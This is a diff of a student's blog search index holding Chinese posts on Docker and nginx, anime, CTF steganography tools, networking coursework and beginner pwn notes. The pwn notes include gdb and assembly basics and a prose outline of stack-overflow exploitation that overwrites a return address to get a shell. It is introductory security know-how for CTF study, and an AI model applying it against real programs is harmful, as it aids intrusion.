+    <url>/2022/06/23/%E5%9B%A2%E9%98%9F%E4%B8%BB%E9%A1%B5%E7%9A%84%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<p>一开始用的是nginx直接部署<br>过程忘记写在这里了  </p>
+<p>error while loading shared libraries: libpcre.so.1: cannot open shared object file: No such file or directory<br><a href="https://www.cnblogs.com/Primzahl/p/9261760.html">解决方法</a></p>
+<p> [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)</p>
+<p>发现80端口被docker占用（郁老大，你可没说有这啊）<br>所以其实我直接用docker拉取nginx，然后部署就行<br>先搜索安装的nginx镜像  </p>
+<pre><code>docker search nginx
+</code></pre>
+<p>然后找到合适的版本进行拉取  </p>
+<pre><code>docker pull nginx  
+</code></pre>
+<p>拉取后运行nginx容器  </p>
+<pre><code>docker run -di --name=nginx -p 90:80 -v /usr/html:/usr/share/nginx/html nginx 
+# -d 后台运行
+# -i 交互方式运行
+# --name 自定义容器名称
+# -p 端口号映射 90 自定义为外部访问端口：80 为nginx容器对外暴露的端口
+# -v 目录挂载  冒号前为 外部目录，冒号后为 容器内目录；相当于外部目录中的内容会映射同步到容器内
+</code></pre>
+<p>这里就需要上传我的html了，可是呢，好巧不巧，我的xshall安装包他无了，<br>我用的是原始一点的putty（）并且只有putty.exe其他啥也没（逃<br>于是就不能用rz这种方便快捷的方式了（呜呜呜  </p>
+<p>netstat -ano  查看已使用端口 状态</p>
+<p>docker的操作<br>docker rm + 名字 删除容器<br>docker start 名字 开启某个容器<br>docker run 镜像名字 部署一个容器<br>-p 物理机端口：docker端口  建立一个端口映射<br>–name&#x3D;名字 设置容器名称<br>-d后台运行<br>-i交互式运行<br>-v 物理机目录：docker目录 目录挂载<br>docker stop 名字  停止一个容器  </p>
+<p>但是我越整越迷，每次部署完nginx都无法访问<br>人都傻了  </p>
+<p>机关算尽，无法解决外网不能访问的问题<br>于是决定撅掉郁老大的ubuntu，换成centos7（）<br>这波是耻辱下播（）  </p>
+]]></content>
+      <categories>
+        <category>团队工作</category>
+      </categories>
+      <tags>
+        <tag>工作</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>凉宫春日的忧郁个人感受（剧透向</title>
+    <url>/2022/06/15/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5%E7%9A%84%E5%BF%A7%E9%83%81%E4%B8%AA%E4%BA%BA%E6%84%9F%E5%8F%97/</url>
+    <content><![CDATA[<p>下一个受害者是： 《幸运星》</p>
+<h1 id="是神作！！"><a href="#是神作！！" class="headerlink" title="是神作！！"></a>是神作！！</h1><p>观看时间：2022&#x2F;6&#x2F;15<br>该作品共有两部动画，分别是06年的乱序版和09版<br>后者包含前者部分，所以建议只看09版就行<br>复制粘贴自百度百科<br> 《凉宫春日的忧郁（2009年版）》于2009年4月2日开始播放，全28话（包括2006年版的14话），香港TVB将2009版本译为《凉宫春日的忧郁 1X2》。<br>2007年7月7日，“SOS团官方网站”施行“七夕”活动，《朝日新闻》早报上出现“凉宫春日第2期决定制作！”全页广告。2007年12月18日，“SOS团官方网站”施行“消失”活动，宣布“第2期中止。将以此为基础决定制作全新动画”。但是在2008年8月26日，《少年ACE》公布的却是新动画《小凉宫春日的忧郁》&amp;《喵☆小鹤屋学姐》动画版制作决定。在2009年2月6日发售的《Newtype》3月号上，正式宣布了TV动画“凉宫春日第2期”的制作决定。<br>《凉宫春日的忧郁（2009年版）》于2009年4月2日开始“从头”播放，由十四集新作和2006年版的十四集交叉播出。其中的新作《漫无止境的八月》更是忠实原著情节，以每集更换导演、重新作画及录音的独特表现重演了八次，成功诠释依春日之愿不断重复的暑假。 </p>
+<h2 id="SOS团官网（逃"><a href="#SOS团官网（逃" class="headerlink" title="SOS团官网（逃"></a><a href="http://www.haruhi.tv/#">SOS团官网（逃</a></h2><p>#个人感受：<br>故事是一男主阿虚（他叫啥来自？）进入高中的视角，围绕凉宫春日同学的古怪行径（特殊能力）而展开的一系列故事<br>包括但不限于：<br>0、卡密sama<br>1、外星人，未来人，超能力者<br>2、可爱大胸萝莉（不是）<br>3、寡言看书眼睛（后来没了）娇小但能打<br>4、有神论<br>5、SOS团！！<br>6、在虚构的故事里寻求真实感的人脑袋一定有问题（逃）  </p>
+<p>相信世界上有外星人、未来人、超能力者的凉宫春日同学有着卡密sama改变世界的力量<br>于是就有了外星人，未来人和超能力者  </p>
+]]></content>
+      <categories>
+        <category>动漫观感</category>
+      </categories>
+      <tags>
+        <tag>二次元爬</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn的浅尝（二）</title>
+    <url>/2022/05/19/pwn%E7%9A%84%E6%B5%85%E5%B0%9D%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
+    <content><![CDATA[<p>再水点</p>
+<h1 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h1>]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn的浅尝（一）</title>
+    <url>/2022/05/17/pwn%E7%9A%84%E6%B5%85%E5%B0%9D%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="跟着duchao大佬学pwn！！！"><a href="#跟着duchao大佬学pwn！！！" class="headerlink" title="跟着duchao大佬学pwn！！！"></a>跟着duchao大佬学pwn！！！</h1><p><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from=333.337.search-card.all.click">b站传送门</a></p>
+<p>不整背景故事了，因为人家都整的有，我再整就多了</p>
+<h2 id="前期感想"><a href="#前期感想" class="headerlink" title="前期感想"></a>前期感想</h2><p>根据我近期的学习情况，pwn的需要不少前置知识  </p>
+<h3 id="Ⅰ-linux的使用（轻度，能用就可，可以慢慢学"><a href="#Ⅰ-linux的使用（轻度，能用就可，可以慢慢学" class="headerlink" title="Ⅰ  linux的使用（轻度，能用就可，可以慢慢学"></a>Ⅰ  linux的使用（轻度，能用就可，可以慢慢学</h3><h3 id="Ⅱ-gdb（要会调试，会看参数"><a href="#Ⅱ-gdb（要会调试，会看参数" class="headerlink" title="Ⅱ  gdb（要会调试，会看参数"></a>Ⅱ  gdb（要会调试，会看参数</h3><h3 id="Ⅲ-汇编语言（重度，可以说你要是看不懂前期就是坐牢"><a href="#Ⅲ-汇编语言（重度，可以说你要是看不懂前期就是坐牢" class="headerlink" title="Ⅲ  汇编语言（重度，可以说你要是看不懂前期就是坐牢"></a>Ⅲ  汇编语言（重度，可以说你要是看不懂前期就是坐牢</h3><h3 id="Ⅳ-一定的编程基础（要是没有，就会换种方式坐牢"><a href="#Ⅳ-一定的编程基础（要是没有，就会换种方式坐牢" class="headerlink" title="Ⅳ  一定的编程基础（要是没有，就会换种方式坐牢"></a>Ⅳ  一定的编程基础（要是没有，就会换种方式坐牢</h3><h3 id="Ⅴ-python脚本的使用（能明白是啥就行"><a href="#Ⅴ-python脚本的使用（能明白是啥就行" class="headerlink" title="Ⅴ  python脚本的使用（能明白是啥就行"></a>Ⅴ  python脚本的使用（能明白是啥就行</h3><p>如果对上述知识有所学习或者精通的大佬，可以学PWN<br>不然的话就把上述知识补习一下即可<br>（ps：这些都是基础，想走关于计算机的路，学了总不亏）  </p>
+<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>这个可以说是很重要的工具了，配合vmmap，pwntools等插件食用更佳<br>一般用来直接对可执行程序进行动态调试，这个过程可以找到潜在的漏洞<br>就好比是纯粹骨钉，是主要武器  </p>
+<h3 id="食用说明"><a href="#食用说明" class="headerlink" title="食用说明"></a>食用说明</h3><p>我只写一下我学习pwn过程中用到的，以后可能会有专门讲gdb的博客出现吧（逃  </p>
+<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>有那么几种指针，我们统称指针</p>
+<pre><code>*[数字]  $[寄存器]  &amp;[函数]
+</code></pre>
+<p>开始使用  </p>
+<pre><code>gdb [被调试文件全称]
+</code></pre>
+<p>开始调试</p>
+<pre><code>1 start
+2 run
+</code></pre>
+<p>列出当前函数信息</p>
+<pre><code>disassemble
+disassemble [函数指针] //列出相应函数信息
+</code></pre>
+<p>查看信息</p>
+<pre><code>i          //（information）
+i r     //查看寄存器
+i b     //查看断点
+……
+</code></pre>
+<p>查询相关信息</p>
+<pre><code>search [字符串]  //查找相应串
+search  [指针]   //查找相应对象
+</code></pre>
+<p>打印</p>
+<pre><code>p   //print
+p [指针]
+p [数学计算]
+……
+</code></pre>
+<h4 id="比较重要的操作"><a href="#比较重要的操作" class="headerlink" title="比较重要的操作"></a>比较重要的操作</h4><p>X列出信息</p>
+<pre><code>x/[要看的单位数][格式] [指针]//总之是常用且重要的指令
+</code></pre>
+<p>set修改信息</p>
+<pre><code>set [指针] [信息]    //当然这个信息也可以是指针
+</code></pre>
+<h4 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h4><p>pwntools一定要装，或者用更好的插件<br>并且为pwntools设置另一个伪终端作为输出窗口，体验感飙升<br>相当于骨钉升级为纯粹骨钉，效果拔群  vmmap还没学明白，摆  </p>
+<p>记得多跑跑程序，加深印象</p>
+<h2 id="你的汇编大爹"><a href="#你的汇编大爹" class="headerlink" title="你的汇编大爹"></a>你的汇编大爹</h2><p>有王爽老师的8086汇编课程基础的佬超级nice<br>没有的话，不完全影响<br>你需要看明白汇编语句的意思，然后去gdb几下，加深理解<br>这里用Intel的方法来书写</p>
+<h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><pre><code>mov [指针],[指针/值]//把后者的[值]赋给前者  
+add [指针],[指针/值]//前者的[]值加上后者的[值]  
+sub [指针],[指针/值]//前者的[值]减去后者的[值]   
+jmp [地址值/指针]rip（eip）（也就是函数当前执行位置）跳转到目标地址   
+lea [指针],[指针/值]//把后者的[指针]赋给前者  
+push [值]  //把一个值压入栈中  
+pop       //弹出栈顶
+pop [指针]  //弹出栈顶，并赋值给该指针所指 
+call [地址值/指针]  调用该地址的函数  
+//相当于push $rip  jmp [目标位置]    
+leave返回上个函数的栈状态//相当于pop rbp     
+ret 退出函数  //相当于pop rip  
+cmp [指针],[指针/值]    //前减去后是否为0，为零，z=1，不为零，z=0    
+jz je [指针/地址值]  //如果z=1，跳转到目标行      
+jnz jne [指针/地址值]  //如果z=0 跳转
+  
+</code></pre>
+<h3 id="函数组成"><a href="#函数组成" class="headerlink" title="函数组成"></a>函数组成</h3><p>bp: ebp  rbp<br>sp: esp  rsp  </p>
+<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈的维护，保障了函数高效无误的运行<br>一般来说，bp表示栈底，sp表示栈顶<br>系统栈是从高位向低位生长的，而里面的数据是以小端序进行放置的<br>当我们使用gets之类的函数进行读入时，数据一般会储存在bp-xxx这样一个位置<br>也可以用push来进行数据的入栈，相应的sp会减去一个单位（4byte或8byte）<br>用pop [指针]进行取值，上面有写  </p>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在call一个函数时，会先 push $ip 进行一个当前位置下一条指令的地址的存储<br>然后在函数中，再 push $bp 进行一个caller函数栈底的记录<br>然后时一个mov bp,sp 进行一个bp的拉起，把bp拉至当前sp<br>（当前的sp就是caller函数的栈顶）<br>最后给sp加上一定值作为缓冲<br>差不多就是</p>
+<pre><code>-------------------------------  
+sp|当前栈顶|  
+--+-------+--------------------    
+bp|当前栈底|存的是caller的栈底地址   
+--+-------+--------------------  
+  |       |caller的下一条指令地址    
+-------------------------------
+</code></pre>
+<p>当然，不同的保护机制所给的缓冲区有一定区别<br>也有canary之类的保护机制<br>不过俺还没学过（逃<br>然后是函数返回<br>在callee函数被执行完的时候，sp会回到bp的位置<br>此时进行一个leave，也就是pop bp<br>再来一个ret （return） 也就是pop rip<br>这样bp、sp、ip就回到caller的状态了     </p>
+<h2 id="基础的漏洞利用"><a href="#基础的漏洞利用" class="headerlink" title="基础的漏洞利用"></a>基础的漏洞利用</h2><p>###栈溢出<br>我止步于此（逃<br>利用get read等可以引起读入溢出的语句，进行溢出攻击<br>具体表现为输入一些数据，覆盖原本栈帧，以便达到目的<br>最好是写py脚本进行利用，方便操作和修改   </p>
+<p>使用gdb动态调试，可以寻找程序内可以利用的地方<br>利用get读入的不严谨性，把我们找到的可利用函数的地址和利用该函数所需的数据，覆盖掉原本的返回地址和部分数据，即可利用该漏洞，从而获取shall和其他信息  </p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn的一些前置工具的装配</title>
+    <url>/2022/05/12/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%9A%84%E8%A3%85%E9%85%8D/</url>
+    <content><![CDATA[<p>这里只是记一下怎么装的，我菜，也不懂</p>
+<h1 id="学不会pwn…………"><a href="#学不会pwn…………" class="headerlink" title="学不会pwn…………"></a>学不会pwn…………</h1><p>需要一些小小的插件，不然你就只能看汇编了  </p>
+<h2 id="1-gdb"><a href="#1-gdb" class="headerlink" title="1.gdb"></a>1.gdb</h2><p>这东西现在的大多数基于linux的系统都会有吧应该</p>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><pre><code>sudo apt update
+sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y
+python3 -m pip install --upgrade pip
+pip3 install --upgrade pwntools
+</code></pre>
+<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre><code>sudo apt install checksec
+</code></pre>
+<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><pre><code>git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh
+</code></pre>
+<h2 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h2><pre><code># 1
+$ pip install peda
+# 2
+$ git clone https://github.com/longld/peda.git ~/peda
+$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit 
+</code></pre>
+]]></content>
+      <categories>
+        <category>不会pwn的人的挣扎</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>隐写的一点点积累</title>
+    <url>/2022/05/05/%E8%A7%A3%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E7%A7%AF%E7%B4%AF/</url>
+    <content><![CDATA[<h1 id="隐写啊……阿巴阿巴阿巴"><a href="#隐写啊……阿巴阿巴阿巴" class="headerlink" title="隐写啊……阿巴阿巴阿巴"></a>隐写啊……阿巴阿巴阿巴</h1><p>写了一些些题目，有一点收获，但是我的记忆只有不到一周（逃<br>不写下来就又忘了，特此浅写一点点来给自己看  </p>
+<h2 id="丢010里看看呗"><a href="#丢010里看看呗" class="headerlink" title="丢010里看看呗"></a>丢010里看看呗</h2><p>010起手，主要看文件类型、文件完整性还有隐藏在十六进制代码里面的信息<br>建议直接ctrl+F flag 因为所有题都是这样（逃<br>这样可以方便寻找方向  </p>
+<h2 id="有个叫做lsb的东西"><a href="#有个叫做lsb的东西" class="headerlink" title="有个叫做lsb的东西"></a>有个叫做lsb的东西</h2><p>貌似是最低有效位隐写，虽然不知道原理是啥吧，但是能写<br>一般的，丢到stegsolve里面，看看各个通道的图层<br>哪个通道的最低位有异常，那大概是那个通道用于lsb了<br>然后就用DATA extract给整一下lsb<br>（不想整图，等到我成为学长时候在整具体的）  </p>
+<h2 id="有个调整png显示大小的"><a href="#有个调整png显示大小的" class="headerlink" title="有个调整png显示大小的"></a>有个调整png显示大小的</h2><p>一般就是CRC不对劲时候（win能打开，linux打不开时候也是）<br>去找找有无关于图片大小的提示，改一下，看看能不能显示出特殊信息<br>或者弄个脚本呗，暴力枚举大小，通过crc正确性进行判断  </p>
+<h2 id="还有个啥来着？"><a href="#还有个啥来着？" class="headerlink" title="还有个啥来着？"></a>还有个啥来着？</h2><p>记一些奇怪的插件  </p>
+<h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>基础，好用，感觉不对劲直接扔kali里跑个binwalk<br>大概率能发现群友奇怪的成分（雾<br>然后用下面这个</p>
+<h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><p>用于分离文件，禁止文件贴贴，可以拿到藏起来的文件  </p>
+<h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h3><p>很吊的linux脚本，直接zsteg -a<br>管他啥通道隐写啊，全部给你整出来，你按需拿取即可<br>适合一把梭玩家（逃</p>
+<h3 id="snow-exe"><a href="#snow-exe" class="headerlink" title="snow.exe"></a>snow.exe</h3><p>没明白</p>
+<h3 id="破解压缩包密码也算隐写（不是"><a href="#破解压缩包密码也算隐写（不是" class="headerlink" title="破解压缩包密码也算隐写（不是"></a>破解压缩包密码也算隐写（不是</h3>]]></content>
+      <categories>
+        <category>杂七杂八的东西</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>四月总结</title>
+    <url>/2022/04/30/%E5%9B%9B%E6%9C%88%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="四月是寄的一月"><a href="#四月是寄的一月" class="headerlink" title="四月是寄的一月"></a>四月是寄的一月</h1><h2 id="4-9蓝桥省赛"><a href="#4-9蓝桥省赛" class="headerlink" title="4.9蓝桥省赛"></a>4.9蓝桥省赛</h2><p>学校是封的<br>比赛是教室开的<br>题目是看不懂的<br>人是麻的  </p>
+<h2 id="麻辣香锅"><a href="#麻辣香锅" class="headerlink" title="麻辣香锅"></a>麻辣香锅</h2><p>麻辣香锅一时爽，一直吃一直爽  </p>
+<h2 id="4-10-解封"><a href="#4-10-解封" class="headerlink" title="4.10  解封"></a>4.10  解封</h2><h2 id="分流"><a href="#分流" class="headerlink" title="分流"></a>分流</h2><p>选了物联网，不过反正要run的，都行吧</p>
+<h2 id="4-21给蓝桥官网联习系统干破防了"><a href="#4-21给蓝桥官网联习系统干破防了" class="headerlink" title="4.21给蓝桥官网联习系统干破防了"></a>4.21给蓝桥官网联习系统干破防了</h2><p>什么牛马东西，错了就给个错误，没有反馈，题解也都很烂，还是我的luogu友好  </p>
+<h2 id="4-22开始整misc玩"><a href="#4-22开始整misc玩" class="headerlink" title="4.22开始整misc玩"></a>4.22开始整misc玩</h2><h2 id="4-25我们班的人真强，整个专业各个班都有我们班的管事儿的（逃"><a href="#4-25我们班的人真强，整个专业各个班都有我们班的管事儿的（逃" class="headerlink" title="4.25我们班的人真强，整个专业各个班都有我们班的管事儿的（逃"></a>4.25我们班的人真强，整个专业各个班都有我们班的管事儿的（逃</h2><h2 id="4-28蓝桥结果出来了，浅拿省一，按下不表"><a href="#4-28蓝桥结果出来了，浅拿省一，按下不表" class="headerlink" title="4.28蓝桥结果出来了，浅拿省一，按下不表"></a>4.28蓝桥结果出来了，浅拿省一，按下不表</h2><h2 id="4-30写下这个东西"><a href="#4-30写下这个东西" class="headerlink" title="4.30写下这个东西"></a>4.30写下这个东西</h2>]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>划水</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>http协议浅尝</title>
+    <url>/2022/04/29/http%E5%8D%8F%E8%AE%AE%E6%B5%85%E5%B0%9D/</url>
+    <content><![CDATA[<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>用户访问https:&#x2F;<a href="http://www.baidu.com/index.html%E9%93%BE%E6%8E%A5%E5%90%8E">www.baidu.com/index.html链接后</a><br>1.浏览器分析超链接中的URL<br>2.浏览器请求解析目标<a href="http://www.baidu.com的ip地址/">www.baidu.com的IP地址</a><br>3.DNS将解析出的IP220.181.38.148返回浏览器<br>4.浏览器与服务器建立TCP（80端口）链接<br>5.浏览器请求文档： GET&#x2F;index.html<br>6.服务器给出响应，将文档index.html发送给浏览器<br>7.释放TCP链接<br>8.浏览器显示index.html中的内容  </p>
+<h2 id="非持久性连接"><a href="#非持久性连接" class="headerlink" title="非持久性连接"></a>非持久性连接</h2><p>http0.9和http1.0会有<br>对于请求web页含有多个其他文档对象的连接情况，小笼包低下</p>
+<h2 id="持久性连接"><a href="#持久性连接" class="headerlink" title="持久性连接"></a>持久性连接</h2><p>可以进行多次请求和响应，服务器响应后不立即释放连接，可继续进行请求  </p>
+]]></content>
+      <categories>
+        <category>知识储备</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅学通信网络基础第三章</title>
+    <url>/2022/03/20/%E6%B5%85%E5%AD%A6%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
+    <content><![CDATA[<p>网络延时</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>通信网络特点：资源共享</p>
+<p>会出现资源无法获得的情况（如被占用）： 延迟（Delay），丢弃（loss）</p>
+<p>衡量网络传输能力的重要指标使将分组从源节点传到目的节点的时延  包括接入方式，路由选择，流量和拥塞的控制</p>
+<h2 id="网络时延模型"><a href="#网络时延模型" class="headerlink" title="网络时延模型"></a>网络时延模型</h2><h3 id="处理时延"><a href="#处理时延" class="headerlink" title="处理时延"></a>处理时延</h3><p>一个分组到达节点输入端与其到达输出端之间的时延</p>
+<h3 id="传输时延"><a href="#传输时延" class="headerlink" title="传输时延"></a>传输时延</h3><p>指节点开始发送第一比特到发完最后一比特的时间</p>
+<h3 id="传播时延"><a href="#传播时延" class="headerlink" title="传播时延"></a>传播时延</h3><p>指节点发送第一个比特的时刻到此比特到达接收点的时延</p>
+<pre><code>与电磁波在媒质中传播速度有关，与通信距离成正比，与信道容量本身无关
+传播时延=信道长度/在信道的传播速度
+电磁波在自由空间光速传播，在网络传输中慢一点
+铜线电缆  ：2.3*10^5
+光纤：2.0*10^5
+</code></pre>
+<h3 id="排队时延"><a href="#排队时延" class="headerlink" title="排队时延"></a>排队时延</h3><p>分组进入传输队列到分组实际进入传输的时延；分组进入等待队列到分组进入节点处理的时延</p>
+<hr>
+<p>排队模型：</p>
+<h4 id="到达过程–顾客到达的规则和行为"><a href="#到达过程–顾客到达的规则和行为" class="headerlink" title="到达过程–顾客到达的规则和行为"></a>到达过程–顾客到达的规则和行为</h4><p>到达数目：有限或无限<br>到达间隔：确定或随机<br>到达方式：独立或成批到达</p>
+<h4 id="排队规则"><a href="#排队规则" class="headerlink" title="排队规则"></a>排队规则</h4><p>等待制：系统忙时，顾客在系统中等待<br>损失制：顾客发现系统繁忙，立即离开系统（如日常使用的电话通信系统）<br>服务顺序：FCFS、、LCFS等</p>
+<h4 id="服务过程–服务规则和时间"><a href="#服务过程–服务规则和时间" class="headerlink" title="服务过程–服务规则和时间"></a>服务过程–服务规则和时间</h4><p>服务员个数：无穷、单个或多个<br>服务时间：确定或随机  </p>
+<hr>
+<p>在不同的传输网络中，顾客和服务时间可能各不相同<br>在分组交换网络中，顾客就是分组，服务时间为分组传输时间<br>在电话交换网络中，顾客就是呼叫，服务时间为呼叫持续的时间  </p>
+<h4 id="排队时延的计算"><a href="#排队时延的计算" class="headerlink" title="排队时延的计算"></a>排队时延的计算</h4><p>已知量  </p>
+<pre><code>顾客到达率λ（单位时间进入系统的平均顾客数，也称单位时间内进入的“典型顾客数”，“典型”是时间平均）  
+服务速率μ（制系统忙时单位时间内服务的典型（平均）顾客数）  
+</code></pre>
+<p>求解量  </p>
+<pre><code>系统中平均顾客数N（他是在等待队列中和正接受服务的顾客数之和的平均数）  
+每个顾客的平均时延T（即每个顾客等待所花的时间加上服务时间至和的平均值）
+</code></pre>
+<h1 id="Little定理"><a href="#Little定理" class="headerlink" title="Little定理"></a>Little定理</h1><p>顾客到达率λ<br>系统中平均顾客数N<br>每个顾客的平均时延T</p>
+<h2 id="公式-N-x3D-λT"><a href="#公式-N-x3D-λT" class="headerlink" title="公式  N&#x3D;λT"></a>公式  N&#x3D;λT</h2><p>系统的用户数&#x3D;用户平均到达率*平均时延<br>1.他关心的只是排队系统的三个统计平均量，对某个过程的具体时间以及排队规则不做要求<br>2.公式中三个统计平均量必须是针对一个顾客群体而言的，也就是只要这三个统计平均量是针对同一个顾客群体定义，其间就存在Little公式</p>
+<p><img src="https://imgtu.com/i/qnr3QI"><br><img src="/"><br><img src="/">  </p>
+<h1 id="M-x2F-M-x2F-m型排队系统的表征"><a href="#M-x2F-M-x2F-m型排队系统的表征" class="headerlink" title="M&#x2F;M&#x2F;m型排队系统的表征"></a>M&#x2F;M&#x2F;m型排队系统的表征</h1><h2 id="排队系统的表示方式-A-x2F-B-x2F-C-x2F-D-x2F-E"><a href="#排队系统的表示方式-A-x2F-B-x2F-C-x2F-D-x2F-E" class="headerlink" title="排队系统的表示方式  A&#x2F;B&#x2F;C&#x2F;D&#x2F;E"></a>排队系统的表示方式  A&#x2F;B&#x2F;C&#x2F;D&#x2F;E</h2><h3 id="A-表示到达时间间隔分布"><a href="#A-表示到达时间间隔分布" class="headerlink" title="A 表示到达时间间隔分布"></a>A 表示到达时间间隔分布</h3><h3 id="B-服务时间分布"><a href="#B-服务时间分布" class="headerlink" title="B 服务时间分布"></a>B 服务时间分布</h3><p>A，B包含：<br>M：指数分布<br>D：确定性分布<br>Ek：爱尔兰分布<br>G：一般分布</p>
+<h3 id="C-服务员个数"><a href="#C-服务员个数" class="headerlink" title="C 服务员个数"></a>C 服务员个数</h3><h3 id="D-服务系统容量"><a href="#D-服务系统容量" class="headerlink" title="D 服务系统容量"></a>D 服务系统容量</h3><p>包括正被服务和等待的用户<br>缺省时默认为无穷大</p>
+<h3 id="服务规则"><a href="#服务规则" class="headerlink" title="服务规则"></a>服务规则</h3><p>先来先服务（FCFS）<br>后来先服务（LCFS）<br>随即服务（SIRO）<br>缺省时默认FCFS  </p>
+<h2 id="M-x2F-M-x2F-1型"><a href="#M-x2F-M-x2F-1型" class="headerlink" title="M&#x2F;M&#x2F;1型"></a>M&#x2F;M&#x2F;1型</h2><p>到达是poisson过程，到达率是λ<br>允许排无限长的队（系统缓存无限）<br>服务过程为指数过程，服务速率为μ（平均服务时间为1&#x2F;μ）<br>服务员为1个，到达过程与服务过程互相独立<br>稳态概率为Pn &#x3D;（ρ^n）*（1-ρ） n&#x3D;0，1，2……<br>（也就是有n个客户的概率和系统状态的稳态概率）<br>ρ&#x3D;λ&#x2F;μ 反映了繁忙程度（litte）<br>空闲概率：P0 &#x3D;（1-ρ）<br>排队概率为ρ<br>平均用户数为</p>
+<h3 id="N-x3D-∑-∞-n-x3D-0-nPn-x3D-∑-∞-n-x3D-0-nρ-1-ρ"><a href="#N-x3D-∑-∞-n-x3D-0-nPn-x3D-∑-∞-n-x3D-0-nρ-1-ρ" class="headerlink" title="N&#x3D;∑(∞,n&#x3D;0)nPn &#x3D; ∑(∞,n&#x3D;0)nρ*(1-ρ)"></a>N&#x3D;∑(∞,n&#x3D;0)n<em>Pn &#x3D; ∑(∞,n&#x3D;0)n</em>ρ*(1-ρ)</h3><h3 id="x3D-ρ-1-ρ-Σ-∞-n-0-nρ-n-1-x3D-ρ-x2F-1-ρ-x3D-λ-x2F-μ-λ"><a href="#x3D-ρ-1-ρ-Σ-∞-n-0-nρ-n-1-x3D-ρ-x2F-1-ρ-x3D-λ-x2F-μ-λ" class="headerlink" title="&#x3D;ρ*(1-ρ)Σ(∞,n-0)nρ^(n-1)&#x3D;ρ&#x2F;(1-ρ)&#x3D;λ&#x2F;(μ-λ)"></a>&#x3D;ρ*(1-ρ)<em>Σ(∞,n-0)n</em>ρ^(n-1)&#x3D;ρ&#x2F;(1-ρ)&#x3D;λ&#x2F;(μ-λ)</h3><p>（我再码公式是孙子）<br><img src="/"><br>（是不是很像上一课的litte例子？）</p>
+<h2 id="M-x2F-M-x2F-m-x2F-m型"><a href="#M-x2F-M-x2F-m-x2F-m型" class="headerlink" title="M&#x2F;M&#x2F;m&#x2F;m型"></a>M&#x2F;M&#x2F;m&#x2F;m型</h2><h2 id="M-x2F-G-x2F"><a href="#M-x2F-G-x2F" class="headerlink" title="M&#x2F;G&#x2F;"></a>M&#x2F;G&#x2F;</h2>]]></content>
+      <categories>
+        <category>通信网络基础</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅学通信网络基础第二章</title>
+    <url>/2022/03/14/%E6%B5%85%E5%AD%A6%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
+    <content><![CDATA[<p><strong>端到端的传输协议</strong><br>问题：如何为源节点和目的节点之间建立可靠通道</p>
+<p>（如何在一条物理链路上进行可靠传输）</p>
+<p>数据链路传输协议</p>
+<pre><code>组帧技术
+
+标识高测光送下来的数据块的起止、特定内容（例如校验比特）的位置
+ 
+差错检测技术
+
+发现传输中的错误
+
+请求发端重发技术（ARQ）
+
+消除传输错误
+</code></pre>
+<p>（如何在多条物理链路上进行可靠地数据传输）</p>
+<p>网络层、运输层传输协议  </p>
+<pre><code>网络层的端到端传输协议
+
+会话过程的标识/分组的编号、差错控制、流量控制    
+
+运输层的端到端传输协议
+
+差错控制和流量控制
+</code></pre>
+<hr>
+<h1 id="组帧技术"><a href="#组帧技术" class="headerlink" title="组帧技术"></a>组帧技术</h1><p>有开始和结束点的一组二进制数，内含校验比特</p>
